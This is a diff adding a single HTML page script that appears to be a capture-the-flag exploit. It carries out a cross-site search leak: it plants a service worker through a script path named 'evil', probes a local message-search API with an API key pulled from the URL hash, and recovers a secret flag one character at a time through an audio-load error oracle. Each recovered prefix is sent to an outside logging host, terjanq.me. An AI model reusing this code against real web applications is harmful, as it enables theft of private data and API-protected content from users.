@@ -1,0 +1,76 @@
+
+<script>
+  
+async function swReady() {
+  await navigator.serviceWorker.register('sw.js');
+  
+  await navigator.serviceWorker.ready;
+  
+  if (!navigator.serviceWorker.controller) {
+    await new Promise(
+      res => navigator.serviceWorker.addEventListener('controllerchange', res, { once: true })
+    );
+  }
+}
+
+const apiKey = decodeURIComponent(location.hash.slice(1));
+
+const oracle = (prefix) => {
+  return new Promise((resolve) => {
+    let sound = document.createElement("audio");
+    sound.src = `http://localhost:9090/messages/search?key=${apiKey}&q=${encodeURIComponent(prefix)}`;
+    sound.onerror = async () => {
+      try {
+          await fetch("/mock.css", { mode: "no-cors" });
+          resolve(false);
+      } catch(err) {
+          console.log(err.message);
+          resolve(true);
+      }
+    };
+    document.body.appendChild(sound);
+  });
+};
+
+const log = async (msg) => {
+  fetch("http://terjanq.me:12345/log?" + encodeURIComponent(msg), {mode: "no-cors"});
+};
+
+
+const alphabeth = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"$%&'()*+,-./:;<=>?@[\\]^_`{|}~ ";
+  
+(async () => {
+  fetch("http://terjanq.me:12345/log?test", {mode: "no-cors"});
+  for (let i = 0; i < 8; i++) {
+    var s = document.createElement('script');
+    s.setAttribute('src',`http://localhost:3000/view/evil/sw.js?q=${i}`);
+    document.head.appendChild(s);
+  }
+  await swReady();
+  console.log("[*] Extract start");
+
+  let flag = 'SEKAI{proxy_said_n0_w4y_l0ng_W4y_4nD_f1n4lllyyy_Y0u_are_H3r3_her';
+
+  while (true) {
+    let found = false;
+    for (let c of alphabeth) {
+      let candidate = flag + c;
+      if (await oracle(candidate)) {
+        flag += c;
+        console.log("[*] flag: " + flag);
+        found = true;
+        break;
+      }
+    }
+    if (!found) {
+      log("notfound")
+      break;
+    }
+    log(flag);
+    if (flag.endsWith('}')) {
+      break;
+    }
+  }
+})();
+</script>
+
